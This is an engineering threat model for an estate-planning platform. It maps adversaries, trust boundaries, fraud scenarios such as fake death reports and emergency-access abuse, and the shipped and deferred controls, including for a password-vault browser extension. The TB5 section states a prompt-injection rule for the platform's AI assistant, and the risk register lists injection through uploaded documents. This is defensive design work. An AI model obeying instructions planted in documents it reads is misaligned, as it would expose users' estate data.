# Estate Planning Platform — Threat Model

**Version:** 1.0 · Methodology: STRIDE per trust boundary + attacker-goal analysis, mapped to NIST 800-53 control families. This document is a living artifact; every new feature PR that crosses a trust boundary requires a threat-model delta.

---

## 1. What makes this platform's threat profile unusual

Most fintech threat models optimize for "attacker steals money today." This platform has three additional properties that reshape the model:

1. **It is a treasure map.** A single account enumerates every asset a family owns, where it is, what it's worth, who inherits it, and — via the vault — the credentials to reach it. Compromise value per account is far higher than a bank login.
2. **Death is a state transition with privileges attached.** The settlement workflow deliberately transfers access to third parties upon death. Any workflow that grants access on death can be attacked by *faking death* or by *being an insider to a real death* (the grieving-family window is a social-engineering goldmine).
3. **Authorized users are potential adversaries.** Trustees, executors, caregivers, and family members hold legitimate grants and also commit a large share of real-world elder financial abuse. The threat model must treat *granted* access as a monitored surface, not a solved problem.

## 2. Adversaries

| Adversary | Capability | Primary goals |
|---|---|---|
| Nation-state / APT | 0-days, supply chain, long dwell | Bulk PII, HNW-individual targeting, persistence |
| Organized crime | Credential stuffing, SIM swap, phishing kits, ransomware | Vault contents, asset intel for fraud, extortion |
| Malicious insider (platform) | Legitimate infra/DB access | Bulk decryption, audit tampering, targeted snooping |
| Malicious insider (estate) | Legitimate role grants | Over-broad access, premature settlement, distribution fraud |
| Opportunist / abusive family member | Owner's devices, shared knowledge, coercion | Account takeover of elderly users, beneficiary manipulation |
| Curious/negligent third-party pro | Attorney/CPA portal access | Data overexposure, credential mishandling |
| Automated/AI-driven attacker | Scaled spearphishing, voice cloning of "the deceased's lawyer" | Settlement-phase social engineering |

## 3. Trust boundaries

TB1: Internet → Edge (CloudFront/WAF/API GW) · TB2: Edge → Services (authn/z) · TB3: Service ↔ Service (mesh) · TB4: Services → Data stores · TB5: Platform → Third parties (Plaid, LLM providers, death-data providers, notification carriers) · TB6: Client device (Zone A crypto happens here) · TB7: Human operators → Production · TB8: Role-holders → Owner's estate data · TB9: Vault extension ↔ arbitrary web pages (added by M16).

TB9 is genuinely new rather than a subdivision of TB6. TB6 is the client DEVICE, whose adversary is malware or injected script on a surface we serve. TB9's adversary is an arbitrary PAGE the user visits — code we did not write, on an origin we do not control, reached over a channel (an extension that can read and write that page's DOM) which did not exist before M16. The two fail differently: TB6 is defended by the isolated origin, its CSP and its empty dependency tree, none of which apply to a page, while TB9 is defended by origin matching, a gesture requirement and a permission set. See §6j.

## 4. STRIDE highlights per boundary (top findings, not exhaustive)

**TB1/TB2 — Edge & AuthN**
- *Spoofing:* Credential stuffing and SIM-swap-based recovery abuse. → Passkey-first, SMS never sufficient alone, breach-corpus password checks, per-account **and best-effort per-address** rate limits (M17 PR1 — **per-IP is NOT built**: identity has no client IP, neither public edge forwards one, and edge limiting is blocked on the M5 cloud half; see §6k), device binding.
- *DoS:* Shield Advanced + autoscaling + per-tenant load shedding; settlement endpoints get separate quotas so an attack can't mask fraud attempts in noise.
- *Info disclosure:* GraphQL introspection off in prod; persisted queries only; error responses genericized.

**TB4 — Data stores**
- *Tampering:* Audit chain hash-anchored to WORM storage; DB roles cannot UPDATE/DELETE event tables; nightly chain verification with paging on gap.
- *Info disclosure:* Bulk-decryption detection — per-principal decrypt-rate baselines with hard circuit breakers. DETECTION SHIPPED IN M18 (§6q) and its signal is the `crypto.field.decrypted` audit stream, NOT KMS telemetry: every Zone B decrypt emits fail-closed before plaintext is released, while the 5-minute DEK cache means N reads under a hot key are N audit events and ZERO KMS operations — KMS-side monitoring structurally cannot see read volume, in the cloud exactly as locally. Bounds are fixed reviewed constants set from measured ceilings (never a learned baseline an attacker could train, and never the old "normal × 50" formula), and for the one class whose legitimate volume scales with ESTATE SIZE rather than with activity a count is joined by a DISTINCT-SUBJECT condition — both must be exceeded, which suppresses re-reading without moving the threshold at which a mass read of different rows breaches (§6q(ii)). ENFORCEMENT — suspending the KMS grant, paging a security operator — remains cloud-blocked (real IAM, TB7): the grant is still the RESPONSE chokepoint, but it was never the detection signal.
- *Elevation:* IRSA-scoped pod identities; no shared DB users; RLS as a second net under application authz.

**TB5 — Third parties**
- *Plaid token theft:* Access tokens decryptable only inside the sync worker's isolated namespace; tokens are per-item revocable; webhook signatures verified; anomalous sync patterns alert.
- *LLM data leakage:* Privacy proxy tokenizes names/SSNs/account numbers before provider calls; zero-retention contracts; per-feature consent; prompt-injection defense for any AI feature that reads user-uploaded documents (uploaded doc content is untrusted input — the assistant must never treat document text as instructions, and tool scopes for the assistant are read-only).
- *Death-data providers:* Treated as *signals*, never triggers. See §5.1.
- *Supply chain:* Pinned digests, SBOM + SLSA provenance, cosign verification at admission, dependency review gates, vendored critical libs, no postinstall scripts in CI.

**TB6 — Client**
- *Vault key theft via malware/XSS:* Strict CSP, Trusted Types, no third-party scripts on vault surfaces, WebCrypto non-extractable keys where platform allows, memory zeroization best-effort, clipboard auto-clear, re-auth on vault open.
- *Coercion/shoulder-surfing of elderly users:* Optional "trusted-contact review" mode where high-risk changes (new beneficiary + address change + export within 24h) trigger a notification hold.

**TB9 — Vault extension ↔ arbitrary web pages** (M16)
- *Filling the wrong origin (credential exfiltration):* This is the boundary's defining failure, because a filled credential belongs to the page that received it — the isolated world protects the extension's variables, not the DOM value, so the origin decision IS the disclosure decision. → Registrable domain via a vendored, digest-pinned Public Suffix List snapshot (never a substring, never label stripping); scheme binding, so an `https`-saved credential is never offered on `http`; THE FILL TOUCHES THE TOP FRAME AND NOTHING ELSE — which is narrower than this
section originally described, and the narrowing is the result of measuring the platform in Chrome 151 rather than reasoning about it. The old text promised "cross-origin iframes refused by default with a per-item opt-in", and both halves turned out to be wrong. `activeTab` grants exactly the main frame's ORIGIN, host-exact, so a same-site subframe on a different host (`pay.example.com` under `example.com`) is refused by Chrome outright; PR3a's `frameIsAllowed` would have computed "allowed" for a frame the fill could only ever fail on. And the per-item opt-in CANNOT BE BUILT on `activeTab` at all: honouring it needs host permissions for the third-party origin (`optional_host_permissions` plus a runtime `chrome.permissions.request()`), a manifest key and a consent surface this milestone does not have. `frameIsAllowed` IS DELETED rather than kept, because wiring it showed it can have no caller: the popup cannot enumerate frames (that needs `webNavigation` or `tabs`, deliberately not held), and the injected function cannot import it (`func` is serialized). A rule with nowhere to run is the M4 zero-callers shape. What replaces it is stronger than a rule of ours — THE PLATFORM ENFORCES IT, and refuses an injection into any frame the grant does not cover. **Accepted cost, stated rather than hidden:** a login form inside an iframe is not filled, including a same-origin one, because the extension cannot name the frame without a permission it refuses to hold. confusable domains REFUSED rather than warned about. **Confusable detection is PARTIAL as shipped, and NARROWER after the M16 PR5 review than PR3a claimed.** Caught: an ASCII homoglyph skeleton (`rn`/`m`, `vv`/`w`, `cl`/`d`, digit-for-letter) and edit-distance-1. **Punycode is no longer flagged as confusable at all**, and removing it made the control stronger rather than weaker. The old rule returned `confusable` whenever EITHER side carried an `xn--` label, without comparing the two — so it was not a comparison, and on any internationalised page every saved item matched it. Because `matchesFor` keeps confusable verdicts and drops only `no-match`, the measured effect was that ONE VISIT TO ANY IDN PAGE returned the WHOLE VAULT from the key holder — every title and every saved registrable domain — which is exactly the disclosure `matchesFor` exists to prevent. It also fired the lookalike refusal, the one phishing bound this section commits to, on every item at once on ordinary pages. Nothing was given up: filling requires the registrable domains to be EQUAL, so a punycode host that is not the saved domain was already unfillable and the clause only decided the LABEL on the refusal. The general Unicode confusable case (including a genuine punycode homograph) needs UTS #39 skeletons over a vendored confusables table plus punycode decoding, and remains a named follow-up. A miss is a `no-match`, so it is still REFUSED for filling — what is lost is the explanation, never the boundary. What replaces the per-item claim is a single page-level notice when the page's own registrable domain is internationalised.
- *A hostile page inducing a fill:* → The content script is structurally unable to REQUEST a credential — its message union carries no such variant and it cannot import the key holder. A fill is a one-shot injection into a named frame at the moment of a gesture in extension-owned UI, so there is no standing channel a page can address. **THE EXTENSION NEVER SUBMITS, AND THAT IS NOT THE SAME AS "NOTHING IS EVER AUTO-SUBMITTED"** — which is what this sentence used to say, and the M16 review measured the difference. A fill must dispatch `input` and `change` or no field notices the value, and the reasoning that withholds `blur` ("a page is free to submit on blur, so dispatching one would be auto-submission by proxy") is true of those verbatim: a jsdom probe against the real module showed a page's `change` listener holding the real secret. There is no fix, because the events ARE the fill; what M16 PR5 changed is ORDER — the username is written before the password, so a page that commits early can no longer get the secret with the username field still empty, which is what it used to get. The on-screen copy no longer asserts "Nothing was submitted" either; it says what Estate did and points the user at the address. Also narrowed: the fill's origin decision is now re-read AT THE GESTURE. It used to run on a page URL captured when the popup rendered, so the key holder's re-decision — documented as defending against "the page navigating between the two calls" — compared the same stale string twice and could not see a navigation at all; what actually stood in the way was Chromium revoking `activeTab`, which nobody measured and no test asserted.
- *A hostile page reading the vault by breadth of access:* → `activeTab` + `scripting` only, with no declared content scripts, so the extension has no view of any page until the user clicks it — and any later broadening is a required-permission increase the browser surfaces as re-consent.
- *Compromised store update (the boundary's un-detectable case):* An auto-updated signed artifact has no CSP in its path, and a self-check is written by the same artifact. → Blast-radius reduction first (an `extension` session audience admitted per handler, so it cannot destroy the VAULT — narrowed in M16 PR4a, which admitted `createItem` and `updateItem`: `reset`, both keyset routes and all eleven emergency routes stay refused, so the keyset survives and the vault still opens, but an unlocked extension can overwrite every ITEM with bytes that are not ciphertext and each one becomes permanently unreadable. `vault_items_versions` holds the prior image and NO PRODUCTION CODE READS IT, so recovery today means an operator with psql. The mitigation and the residual below describe the same moment — an unlocked vault — and this clause used to overclaim against it), permissions pinned as data, reproducible builds, published SLSA provenance, and a third-party-runnable verification procedure. *Residual, accepted and stated:* an update keeping the same permissions exfiltrates everything the user unlocks and the platform cannot detect it.
- *Phishing:* Autofill does not resist it. A credential saved at a lookalike is filled at that lookalike. Passkeys are the structural answer and shipped for the web app in M17 PR5 (§6o; the vault origin and extension remain TOTP-only); the refusal above is the bound M16 owes, and with `activeTab` it fires when the user opens the extension, not when they land on the page.

**TB7 — Operators**

This block was one sentence in the present tense — "No standing prod access; JIT
elevation with peer approval and session recording; all operator reads of user
data are themselves audit events surfaced to the user; separation of duties
between deploy, data, and key administration" — describing a system that has
never had an operator, a production environment, or an operator platform. M21
rewrote it into what is TRUE, what M21 SHIPS, and what is DEFERRED WITH AN
OWNER, because a control asserted in the present tense is what stops the next
person looking. The reason they accumulated invisibly is that TB7 appeared in
no milestone list and had therefore never been sized.

**How many, and how to count them again.** M21's own residual sweep is the
answer: every §6 bullet now carries a leading disposition tag, so the deferrals
owned by this milestone are `grep -c '\[OWNER: M21\]' docs/03-threat-model.md`
— **18** at the time of writing, spread across ten subsections, with a further
15 lines naming TB7 or "the operator platform" across eleven.

The figure has moved four times and never downward — five, twelve, fourteen,
eighteen — and each move was somebody actually measuring, which is the argument
restated rather than an embarrassment. This paragraph first said "twelve
separate deferrals across §§6a–6y" and both halves were wrong in the same
direction as the defect the milestone exists to fix: twelve was a hand count
taken before the sweep tagged anything, and §§6a–6y stops short of §6z and
§6aa — M21's own deltas — so a range written down before the sections exist
undercounts by construction.

Fourteen became eighteen because PR2.5 found the SWEEP under-collecting. The
fence's corpus is bullets, and five declared residual regions (§6b twice, §6f,
§6s, §6t) stood over PROSE PARAGRAPHS — recognized markers, opened blocks, zero
bullets collected, every assertion passing over content it never saw. §6b's two
were TB7 deferrals, so the milestone scoped from this count had not counted its
own. `packages/contracts/test/threat-model-residuals.spec.ts` now fails on a
declared region that collects nothing, which is the narrower and worse case than
the bound PR0 stated: not "outside a declared region and unmarked", but INSIDE
one and still invisible. The tag is the count; a number in prose beside a
greppable mark is a second copy free to drift, and this one drifted while the
fence that was supposed to hold it green went green.

*True today, and cheaply so.* There is no standing production access because
there is no production (E1, the cloud half, is blocked on a business decision).
That sentence costs nothing and proves nothing; it is recorded here so it is not
mistaken for a control.

*Separation of duties — PARTIALLY REAL, at the row rather than the role.* The
§5.1 chain enforces reviewer ≠ reporter and, for staged access, requester ≠
approver, both as DDL CHECKs rather than as convention, and distributions carry a
row-local dual-control CHECK (§6b). That is genuine separation of duties over the
DECISION. Separation between deploy, data and key administration is a property of
IAM roles and remains **E1**.

*Operator identity — the interim, and its one real safety property.*
`settlement_operators` is an append+revoke allowlist whose rows are the history,
consulted through `OperatorGate` (M21 PR2 — before it, four separate admission
paths in one service, disagreeing about which database handle to ask on). The property that matters is that **no runtime
session can mint an operator**: there is deliberately no grant API, so a stolen
operator session cannot widen the allowlist. Until M21 PR1 that property lived
only in three docstrings and was checked nowhere, and one of them was wrong about
its own mechanism — `operators.repo.ts` called its write methods "the CLI-only
write path" while the CLI reimplemented both in raw SQL and called neither, so
the repo's write methods had no caller in the repository at all. **M21 PR1 keeps
the property and makes it checkable** (§6z): the CLI drives the repo, a source
fence asserts in both directions that nothing else does, and the ceremony now
audits — `settlement.operator.granted` / `.revoked`, which is the first entry the
append-only trail has ever carried for the act of granting the authority to
approve a death case. It also **refuses to write when it cannot record**, and
demands a `--by` that fills the `granted_by` column M7 declared and nothing had
ever written.

*Operator authentication — **shipped in M21 PR3a** (§6bb), after PR2's
measurement moved it here.* Before it, an operator was an ordinary account
session that happened to appear in a table. The audience was originally scoped
for PR2 and moved, because measuring the machinery showed it cannot do the thing
the ordering assumed. `AllowSessionAudiences` takes
`Exclude<SessionAudience, 'account'>` — the default is unconditionally prepended
and cannot even be named — and `CallerGuard.audiencesFor` returns
`[...new Set([...serviceWide, ...perRoute])]`, a union that widens and can never
narrow. So decorating a settlement route would admit `['account', 'operator']`:
every ordinary session, exactly as today. WHAT AN AUDIENCE BUYS IS SUBTRACTIVE —
a session carrying it is refused by every service that has not opted in, which is
what `vault` and `extension` buy — and that value is unrealized until an operator
has a surface giving them a reason to hold one. PR3a is therefore the boundary
and PR3b the surface: `AUDIENCE_ADMITTERS.operator` is EMPTY, three identity
routes are widened per handler (`session`, `stepUp`, `logout`), and settlement is
deliberately not among them, so today a redeemed operator session is refused by
every service in the product including the one whose queue it exists to reach.
It also needed a mint path that did not exist: `auth_handoffs` carried
`CHECK (audience IN ('vault'))` — a list with exactly one member, not an equality
— and migration `012_operator_audience.sql` widens that list rather than
replacing the shape. The form matters as much as the value:
`packages/auth-guard/test/session-audience.spec.ts` parses the `IN (…)` shape and
REFUSES any audience CHECK it cannot read, so rewriting this constraint as
`audience = 'vault'` would mean the same thing to Postgres and blind the fence
that guards the whole vocabulary. An earlier version of this paragraph quoted the
equality form, which is precisely the "correction" that would do it. THE MINT IS
ROLE-BLIND and that is not a gap: identity holds no settlement credential and
there is no dblink between the auth and core clusters, so it cannot ask who is an
operator, and a session is a RESTRICTION rather than a claim about its holder.
`OperatorGate` stays the control in every case.

*Operator actions are audited but NOT rate-limited* — **M23**, which is where
§6bb already places it. This line said **M21 PR3b** until PR4's review: PR3b
shipped the surface and no bound, so one item carried two owners and the earlier
one was a merged PR. A deferral pointing at something already delivered is how
an item stops being counted, which is the failure M21 exists to answer.

*Operator reads of user data are audit events — for ONE operator read, and not
for the ones an operator console would make; and none of them is "surfaced to the
user".* CORRECTED IN M21 PR3a, because the earlier version of this sentence was
wrong in both halves and it was wrong in the direction that stops somebody
looking. Measured: `AUDIT_ACTIONS` carries 23 `settlement.*` actions and EVERY
ONE OF THEM IS A WRITE — settlement emits no read event of any kind, so the queue
an operator works from, the case they open and the timeline they read leave no
trace that they were read. Documents emits exactly one operator read,
`document.evidence.accessed` (whose actor class disagreed with its own paired
decrypt event until M21 PR2.5). And `estate.viewed` is `asset.estate.viewed`, an
ASSETS event describing an EXECUTOR's inventory read (§6r) — a different actor
class entirely, cited in a paragraph about operators. **CLOSED for settlement by
M21 PR3b** (§6cc): `settlement.queue.viewed` and `settlement.case.viewed` ship
with the console screens that make the reads, on the rule that a control ships
with its caller — correcting the prose first, rather than adding a routeless
event, was the M18 PR1 precedent. The paragraph's opening sentence describes what
was true before that change and is kept as the record of it. **Owner:
M30** (in-app feed) for showing a user that support accessed their data on a
date, which no mechanism anywhere does. The "Anthropic-style transparency"
phrasing is kept as the goal and no longer stated as a fact.

*Deferred, each with an owner, NOT shipping in M21's minimum slice:* JIT
elevation (**E1** — it needs real IAM); peer approval of an operator action, as
distinct from the reviewer ≠ reporter CHECK that already exists (**M21 follow-on,
not the minimum slice**); session recording (**E1**); KMS grant suspension and
paging on a decrypt-rate anomaly, which is the RESPONSE half of TB4's insider
control whose DETECTION shipped in M18 (**E1**); a human-facing surface for that
M18 alarm, whose reader is an operator who NOW exists (**M23**; this said **M21
PR3b**, which shipped the console without it — the same rot, one paragraph
over, and the reason PR4 swept every TB7 owner rather than the one it tripped
on);
operator-assisted account recovery, which §§6h/6m/6o each name as the remedy that
does not exist (**M21 follow-on**); and the legal-hold lift ceremony, which M9 PR2
shipped noting that a hold outlives case close with no way to release it
(**M21 PR4**).

## 5. Platform-specific attack scenarios (the ones generic checklists miss)

### 5.1 Fraudulent death trigger ("kill them on paper")
**Attack:** Adversary (often a would-be heir or an account-takeover attacker who wants executor-level access) reports the owner dead with a forged certificate or exploits a false-positive from a death-data provider.
**Controls:** (1) No automated trigger from any single source — provider matches only open a *case*. (2) Mandatory human review of certified evidence. (3) Waiting period (default 5 days, configurable up) during which the platform aggressively attempts owner contact through every channel including hardware-key challenge; any owner sign-in with step-up MFA instantly voids the case and flags the reporter. (4) Account enters `deceased_pending` — reads freeze for role-holders and do not thaw. This is a control on grants the owner made *while living*, and a death report is the reason they stop. It is not the control that governs the EXECUTOR, whose authority arrives only on verification and is governed by (5); reading control 4 as covering them left an executor unable to see the estate's contacts at any point, ever. (5) Executor access post-verification is *staged*: inventory first, vault emergency-access last, each stage separately approved — and the estate's CONTACTS are one of the things it stages, released with the documents rung, because who the decedent named is disclosure about living third parties rather than about the estate's holdings. (6) The reporter's identity is verified and recorded; fraudulent reports are preserved for law enforcement.

### 5.2 Emergency-access abuse
**Attack:** A designated emergency contact invokes vault access while the owner is alive but unaware (hospitalized, traveling, cognitively declining).
**Controls:** Waiting period ≥ 24h (owner-configurable), multi-channel owner notification with one-tap deny, optional M-of-N Shamir requirement so no single contact can unlock alone, full audit visible to owner afterward, and scope limits (contacts can be granted vault subsets, not all-or-nothing).

### 5.3 Insider bulk decryption
**Attack:** Platform engineer or compromised service identity attempts mass read of SSNs/documents.
**Controls:** Every released plaintext is one fail-closed `crypto.field.decrypted` event, and the M18 detector (§4 TB4, §6q) alarms on per-principal windowed counts over reviewed bounds — the DEK cache means bulk READS are not bulk KMS operations, so the audit stream, not KMS, is what sees them. Per-user DEKs still mean bulk access across many users requires bulk KMS unwraps (rate-limited and circuit-broken at the grant — the enforcement half, cloud-blocked); CloudHSM roots mean even AWS-level compromise can't silently exfiltrate key material; canary records (fake users with tripwire fields) page on any access.

### 5.4 Grief-window social engineering
**Attack:** After a real death, attackers phish executors/beneficiaries ("probate portal fee required"), possibly with AI voice cloning of the family attorney.
**Controls:** All settlement communication happens in-app only; emails/SMS are content-free pointers by design, and onboarding for role-holders drills this ("we will never link you to a payment page"); executor dashboard shows verified contact cards for the estate's attorney/CPA; distribution approvals are dual-control with step-up MFA.

### 5.5 Beneficiary-conflict information abuse
**Attack:** A beneficiary with read access enumerates other beneficiaries' shares to contest or coerce.
**Controls:** ABAC default — beneficiaries see only assets naming them and only their own designation, unless the owner explicitly opens visibility; access-pattern anomalies (rapid enumeration) alert the owner.
**As built:** the ABAC default is real and enforced for CONTACTS (`effectiveContactReadGrants` → the Cedar PEP). "Unless the owner explicitly opens visibility" is intent, not a shipped control: no mechanism shares an asset or a document with a role-holder, and the platform now refuses to record a grant claiming otherwise (§6s). Rapid-enumeration alerting is §6q's decrypt-rate detector, which raises to the audit chain and a log line — there is no owner notification (§6q).

### 5.6 Ransomware / destructive attack
**Attack:** Encrypt-and-extort against databases and object storage.
**Controls:** Immutable, cross-account, Vault-Locked backups the prod account cannot delete; monthly automated restore verification; event-sourced domains can rebuild projections; ransomware-specific runbook with decision tree and pre-negotiated IR retainer; audit chain proves data integrity post-recovery.

## 6. Risk register (top 10)

| # | Risk | L | I | Residual treatment |
|---|---|---|---|---|
| 1 | Account takeover of elderly / low-security users | H | H | Passkey nudges, trusted-contact review mode, adaptive step-up |
| 2 | Fraudulent settlement trigger | M | Critical | §5.1 layered controls; annual red-team of the flow |
| 3 | Insider bulk data access | M | Critical | KMS chokepoint + detection; JIT access; canaries |
| 4 | Vault client-side compromise (XSS/malware) | M | Critical | CSP/Trusted Types; isolated vault origin; bug bounty focus area |
| 5 | Plaid/aggregation token abuse | M | H | Namespace isolation, revocation drills |
| 6 | LLM prompt injection via uploaded docs | H | M | Untrusted-input framing, read-only tools, output filtering |
| 7 | Supply-chain compromise of a dependency | M | H | SLSA, pinning, admission control, egress allowlists |
| 8 | Legal/compliance failure in a state template | M | H | Attorney-gated template releases; per-state execution-requirement engine |
| 9 | Ransomware | M | H | §5.6; RTO 15m / tested restores |
| 10 | Notification-channel phishing of role-holders | H | M | Content-free notifications, in-app-only sensitive comms |

## 6a. Threat-model delta — M6 vault, Zone A (2026-07-27)

This document requires a delta for every feature PR that crosses a trust
boundary. M6 activates **TB6 (client device)** in earnest: until now no code
held keys the server could not derive, and risk #4 (vault client-side
compromise, Critical) described something that did not exist yet.

**Controls now shipped.**
- Keys derive from the vault password AND a 128-bit device-only Secret Key
  (2SKD), so the server-held verifier and wrapped master key are useless to an
  attacker who has the database and a correct password guess. This is the
  control that makes §5.3 (insider bulk decryption) structurally inapplicable to
  Zone A: there is no bulk decryption path, because there is no decryption path.
- The vault password never transits (SRP-6a). Every unlock failure emits
  `vault.open.failed`, which is what makes §4/TB4-style burst detection possible
  for vault access specifically.
- Master and item keys are unwrapped as **non-extractable `CryptoKey`s**, the
  TB6 "non-extractable keys where the platform allows" control — an injected
  script in the vault origin can use them but not read them out.
- `@estate/vault-crypto` has zero runtime dependencies, enforced by lint and by
  a source-scanning test. This is the TB6 supply-chain control: the code holding
  the only keys that open a vault has no transitive tree to compromise.
- The client pins the KDF and SRP parameters the server serves it, so a
  malicious server cannot downgrade the group or the iteration count.
- Step-up MFA gates vault open and all key-material changes, per §5 of the
  architecture doc.

**Residuals accepted, and why.**
- **[ACCEPTED]** *JS `bigint` is not constant-time.* True of every JavaScript SRP; bounded by
  network jitter, and no code path branches early on a secret comparison.
- **[OWNER: M27]** *Full-history rollback.* A server that serves an old blob AND claims its old
  version is detectable only by client-side last-seen state. Same class as every
  hosted zero-knowledge store. Per-version AAD binding stops the easier attack:
  replaying a blob at a *different* version fails to decrypt.
- **[OWNER: M27]** *Reset is token-gated.* A forgotten password cannot be proven, so the reset
  route is the one place step-up-fresh stolen tokens can destroy — never read —
  a vault. Compensating: distinct audit action, step-up freshness, and owner
  notification when the notification port lands.
- **[OWNER: M27]** *No rate limiting on failed SRP proofs yet.* PARTIALLY closed twice over and
  the remainder is named precisely. M16 capped step-up, which bounds both SRP
  legs transitively because both are step-up gated (§6j); M17 PR1 delivered the
  login bound this bullet was tracked against (§6k). What is still open is
  neither of those: a caller holding a GENUINE step-up can burn handshakes, and
  no bound on the SRP route itself exists. Handshakes burn on attempt in the
  meantime.

**§5.2 emergency-access controls, now shipped (M6 PR2).**
- *Waiting period ≥24h, owner-configurable:* enforced by the platform half of a
  two-level split (`RK = platform_part XOR contacts_part`). Colluding grantees
  hold only the contacts half, which is information-theoretically useless alone,
  so the delay is a cryptographic constraint rather than an honour system.
- *Multi-channel owner notification with one-tap deny:* the notification port
  ships with a stub, and the emergency-access routes **refuse in production**
  while only the stub is wired — a waiting period nobody can be told about is
  not a control. Denial is deliberately the one owner action with no step-up
  requirement, because it must be one tap from a notification.
- *Optional M-of-N:* implemented over GF(2^8), threshold 1 by default.
- *Full audit visible to the owner afterward:* every transition is recorded,
  including refused requests, so a grantee who tried repeatedly is visible.
- *Denial is sticky*, with no time-based cooldown — a cooldown would tell a
  patient grantee how long to wait, and outlasting the owner is the attack.
- *Key substitution* (not in §5.2's list, but the same threat class): shares are
  sealed to a public key the owner confirms out of band by fingerprint, and the
  key each share was sealed to is recorded so a later change is detectable.

**Residual accepted here:** the platform half lives on the server, so a server
that releases it early defeats the waiting period. Inherent to docs/01's design
— a delay enforced by a party is only as good as that party. The split still
guarantees that a database dump alone is insufficient, and that no contact can
act alone.

**Not yet shipped, and therefore not yet mitigated.**
- §5.2's *scope limits* (granting a contact a vault subset) remain deferred;
  per-item keys are in place so it is a later grant feature, not a
  re-architecture.
- §5.1 control 5 — settlement's staged access, with vault emergency access last
  and separately approved — is an **M7 integration point**. The release path
  must consult settlement state once settlement exists.
- The isolated vault origin, CSP, and Trusted Types are frontend controls; no
  vault UI ships in M6, so they land with that surface.

## 6b. Threat-model delta — M7 settlement PR1 (2026-07-27)

M7 activates **TB8 (role-holders → owner's estate data)** in earnest: it is the
first flow where the acting principal is routinely NOT the resource owner, and
the first that deliberately changes another user's account state. §5.1 is the
control specification; this delta records how each control landed.

**Controls now shipped (PR1: intake → review → waiting period → verified).**
- *No automated trigger from any single source (control 1).* Intake only OPENS
  a case. Reporters must already be named by the decedent's contact repository
  (`contacts.linked_user_id`) — no lookup by email or arbitrary id exists, so
  intake cannot enumerate accounts. Death-data provider matches are
  operator-filed signals (`data_provider`), never triggers. One open case per
  decedent (partial unique index).
- *Mandatory human review (control 2).* Operators are ordinary platform users
  on a CLI-managed allowlist (`settlement_operators`; deliberately NO runtime
  grant API — a stolen operator session cannot mint operators). Review
  decisions are step-up-gated; reviewer ≠ reporter is a DDL CHECK plus a row
  check; "no privileged status without recorded review" is a DDL CHECK. The
  reviewing operator can read death-certificate evidence through a dedicated
  documents route whose authority is settlement's answer, cross-checked
  against the document's REAL owner — a reporter registering someone else's
  document id as evidence gets an operator a uniform 404, not a decryption.
- *Waiting period with aggressive owner contact (control 3).* Default 5 days,
  owner-configurable UP to 60 (floor in DDL + schema + service; changes
  refused while a case is open — a pending case's parameters are frozen).
  Escalating contact attempts on a 12h multi-channel schedule, recorded
  append-only. The in-process driver that performs them holds NO transition
  power: timer expiry only makes a case ELIGIBLE; an operator (again never the
  reporter) explicitly confirms, and the confirmation re-checks owner liveness
  against identity's append-only step-up ledger — a step-up newer than the
  case voids it on the spot, restores the account, and flags the reporter.
  That check is enforced TWICE, deliberately: settlement reads liveness before
  asking for the terminal transition, and identity restates the predicate in
  the same single statement as the status write (a `NOT EXISTS` over
  `auth_events` in the CAS `UPDATE`, same cluster, no network hop). Without
  the second one, a step-up landing between settlement's read and its commit
  would be invisible, and — since there is no un-verify ceremony — would
  entomb a living owner in `settlement` irreversibly. The interlock turns that
  race into a refusal (`409 owner_alive`) that voids the case instead.
  The owner's own kill switch is a step-up-gated void route (the step-up IS
  the liveness proof; a bare stolen bearer cannot void).
- *Account enters deceased_pending (control 4).* Cross-service, identity-
  enforced: a closed transition table (active↔deceased_pending→settlement)
  behind a dedicated service credential; identity applies its own invariants
  regardless of what settlement asks. The lock call happens INSIDE the case
  transaction — an unconfirmable lock rolls the transition back. During
  deceased_pending the OWNER's login and sessions stay alive (the rescue
  path) while profile's role-holder contact grants freeze.

  NARROWED BY M23 PR4a, because the sentence above described a control the
  code did not implement. `RolesRepo.effectiveContactReadGrants` carried a
  predicate excluding every owner with a case in `waiting_period`, `verified`,
  `active` OR `distributing` — so the freeze began at the waiting period, as
  written, and then NEVER LIFTED. Combined with the same query's
  `effective_condition = 'immediate'`, which an executor's `on_death_verified`
  designation never satisfies, an executor could not read the estate's contacts
  at any point, ever. Control 4 was silently answering a question that belongs
  to control 5, and answering it "no" forever.

  The narrowing is SCOPED TO THE EXECUTOR, and the scoping is the point. The
  grant query is untouched: an ordinary role-holder's `immediate`
  `contact:read` grant stays frozen from the waiting period onward, exactly as
  before, because that is a permission the owner gave while living and control
  4 is the reason it stops at a death report. What changes is that the
  executor no longer travels that road at all. Their authority is a
  `role_assignment`, not a `permission_grant` — the owner never granted them
  `contact:read` and `ENFORCED_GRANTS` should not grow a row claiming they did
  — so they get a SEPARATE arm, gated on control 5's ladder: the estate's
  contacts open when the DOCUMENTS rung is approved, asked of settlement on the
  executor's own forwarded bearer through the same `checkStageAccess` port
  assets uses for the inventory, and refused when settlement cannot be reached.

  Two arms rather than one widened query, because widening
  `effective_condition` or lifting the freeze predicate would have thawed every
  `on_death_verified` grant for every caller of profile's only grant reader —
  a blast radius nobody asked for, to serve one role.

  At verified the
  status becomes `settlement`, every session is revoked, live-token lookups
  fail via a status allowlist in the session SQL, and re-login gets the
  generic 401 with a distinct recorded reason (`account_settled` — decedent-
  credential replay is a detection signal). Post-verified rescue is
  deliberately not self-serve.
- *Reporter identity preserved (control 6).* `reported_by` is a verified
  platform user; rejected and voided cases are terminal rows that are never
  deletable (cases have no soft delete BY DESIGN), with `resolution`
  distinguishing operator rejection from owner void; every audit event on the
  flow preserves the reporter id.

**New trust machinery, flagged.** A static shared service credential
(`ServiceCredentialGuard`, constant-time compare, fail-closed when unwired;
required ≥32 chars in production) authenticates settlement on identity's
internal settlement-lock routes — the one flow with no user bearer token to
forward by construction. Interim until the mesh (mTLS/SPIFFE) provides
verifiable peer identity; the guard is the seam.

**Deliberate deviations.** Temporal is deferred behind a powerless in-process
driver (approved: there is no deployment for its durability to protect; the
DB state machine docs/02 §7 mandates is authoritative either way). Intake and
review-approve REFUSE in production while only the stub notifier is wired
(503, the M6 emergency-access precedent) — a waiting period nobody can be
told about is not a control.

**Control 5 — staged executor access — now shipped (PR2).**
- *Staged, ordered, separately approved.* `inventory → documents → vault`, and
  the order IS the control: an executor may request only the next rung, each
  requires an operator approval, and Zone A is therefore structurally the
  furthest grant from a fresh death report. A requested stage grants nothing.
- *Two people per stage.* The executor requests, an operator approves, and a
  DDL CHECK forbids them being the same person. Executor designation
  (`role_assignments`, the dormant `on_death_verified` half that settlement is
  the first consumer of) grants nothing on its own.
